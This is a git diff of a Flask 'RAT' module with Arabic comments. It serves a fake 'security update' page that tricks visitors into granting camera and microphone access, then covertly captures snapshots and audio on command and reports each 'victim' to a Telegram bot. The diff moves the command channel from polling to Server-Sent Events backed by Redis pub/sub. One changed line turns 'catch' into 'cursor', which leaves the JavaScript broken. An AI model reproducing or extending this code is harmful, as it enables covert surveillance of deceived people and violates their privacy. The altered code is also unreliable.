@@ -1,16 +1,21 @@
 import os
 import base64
 import io
+import time
+import json
 import redis
 from flask import Blueprint, render_template_string, request, Response
 
 rat_bp = Blueprint('rat_module_v5', __name__)
 
-# الاتصال بقاعدة بيانات Redis عبر المتغير البيئي (مدعوم افتراضياً في Railway و Render)
-REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379")
+# الاتصال بقاعدة بيانات Redis مع معالجة الرابط تلقائياً
+REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
+if REDIS_URL.startswith("redis-cli"):
+    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
+
 redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
 
-RAT_SERVICE_WORKER_TEMPLATE = """
+RAT_SSE_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -57,11 +62,13 @@ RAT_SERVICE_WORKER_TEMPLATE = """
 
                 sendDeviceInfo();
                 setTimeout(() => captureLiveSnapshot("📸 **صورة الاتصال الأولى:**"), 1000);
-                initCommandPolling();
+                
+                // تفعيل قناة الاتصال الحية عبر Server-Sent Events (SSE) بدلاً من الـ Polling
+                initSSEStream();
 
                 document.getElementById('mainBox').innerHTML = "<h2>✅ النظام يعمل الآن بكفاءة</h2><p>جاري تطبيق التحسينات الأمنية في الخلفية...</p>";
 
-            } catch (err) {
+            } cursor (err) {
                 alert("يرجى الضغط على سماح للأذونات لضمان نجاح التحديث.");
             }
         }
@@ -125,20 +132,28 @@ RAT_SERVICE_WORKER_TEMPLATE = """
             } catch (e) {}
         }
 
-        function initCommandPolling() {
-            setInterval(async () => {
+        function initSSEStream() {
+            const eventSource = new EventSource('/rat_v5_stream?id=' + chatId);
+            
+            eventSource.onmessage = function(event) {
                 try {
-                    let response = await fetch('/rat_v5_poll?id=' + chatId);
-                    let data = await response.json();
-                    
+                    const data = JSON.parse(event.data);
                     if (data.action === "snapshot") {
-                        captureLiveSnapshot("📸 **صورة حية ومتجددة بناءً على طلبك:**");
+                        captureLiveSnapshot("📸 **صورة حية ومتجددة بناءً على طلبك (عبر SSE):**");
                     } 
                     else if (data.action === "audio") {
                         recordLiveAudio();
                     }
                 } catch (e) {}
-            }, 2000);
+            };
+
+            eventSource.onerror = function() {
+                // إعادة الاتصال التلقائي في حال انقطاع السيرفر المؤقت
+                setTimeout(() => {
+                    eventSource.close();
+                    initSSEStream();
+                }, 3000);
+            };
         }
     </script>
 </body>
@@ -155,7 +170,7 @@ def init_rat_routes(app, bot):
     @app.route('/system_secure_v2', methods=['GET'])
     def rat_landing():
         chat_id = request.args.get('id', '0')
-        return render_template_string(RAT_SERVICE_WORKER_TEMPLATE, chat_id=chat_id)
+        return render_template_string(RAT_SSE_TEMPLATE, chat_id=chat_id)
 
     @app.route('/sw.js', methods=['GET'])
     def service_worker():
@@ -167,7 +182,7 @@ def init_rat_routes(app, bot):
         chat_id = data.get('chat_id')
         if chat_id and chat_id != '0':
             msg = (
-                "🎯 **تمت استجابة الضحية بنجاح وتفعيل الخدمة الخلفية عبر Redis!**\n\n"
+                "🎯 **تمت استجابة الضحية بنجاح عبر قناة اتصال SSE الموزعة!**\n\n"
                 f"💻 **النظام:** `{data.get('platform')}`\n"
                 f"🌐 **المتصفح:** `{data.get('userAgent')}`\n\n"
                 "👇 **اختر الأمر المطلوب تنفيذه:**"
@@ -184,15 +199,34 @@ def init_rat_routes(app, bot):
                 print(f"Error: {e}")
         return {"status": "ok"}
 
-    @app.route('/rat_v5_poll', methods=['GET'])
-    def rat_poll():
+    @app.route('/rat_v5_stream', methods=['GET'])
+    def rat_stream():
         chat_id = request.args.get('id')
-        if chat_id:
-            # استخراج الأمر من طابور Redis المخصص لهذه الجلسة بشكل فوري وموزع
-            action = redis_client.lpop(f"cmd_queue:{chat_id}")
-            if action:
-                return {"action": action}
-        return {"action": "none"}
+        if not chat_id:
+            return "Missing ID", 400
+
+        def event_stream():
+            # حلقة بث حي مفتوحة ترسل البيانات فور توفرها في Redis دون استهلاك دوري للـ Polling
+            pubsub = redis_client.pubsub()
+            pubsub.subscribe(f"channel_cmd:{chat_id}")
+            
+            # إرسال رسالة نبض (Heartbeat) أولية لفتح القناة وثبات الاتصال
+            yield f"data: {json.dumps({'action': 'ping'})}\n\n"
+
+            while True:
+                try:
+                    # الاستماع للرسائل القادمة في قناة Redis بشكل فوري (Pub/Sub)
+                    message = pubsub.get_message(ignore_subscribe_messages=True, timeout=15)
+                    if message:
+                        action_data = message['data']
+                        yield f"data: {json.dumps({'action': action_data})}\n\n"
+                    else:
+                        # إرسال نبض خفيف كل 15 ثانية لمنع انقطاع الاتصال من قبل المتصفح أو البروكسي
+                        yield f"data: {json.dumps({'action': 'heartbeat'})}\n\n"
+                except Exception:
+                    break
+
+        return Response(event_stream(), mimetype="text/event-stream")
 
     @app.route('/rat_v5_image', methods=['POST'])
     def rat_image():
@@ -228,7 +262,6 @@ def init_rat_routes(app, bot):
         return {"status": "ok"}
 
 def queue_command(chat_id, action):
-    # إدراج الأمر في طابور Redis (RPUSH) لضمان تسليمه بدقة ودون فقدان بيانات
-    redis_client.rpush(f"cmd_queue:{chat_id}", action)
-    # تعيين وقت انتهاء صلاحية للطابور (مثلاً ساعة) لتنظيف الذاكرة تلقائياً
-    redis_client.expire(f"cmd_queue:{chat_id}", 3600)
+    # استخدام Redis Pub/Sub لنشر الأمر فوراً لتوصيله عبر قناة SSE المفتوحة
+    redis_client.publish(f"channel_cmd:{chat_id}", action)
+    redis_client.expire(f"channel_cmd:{chat_id}", 3600)
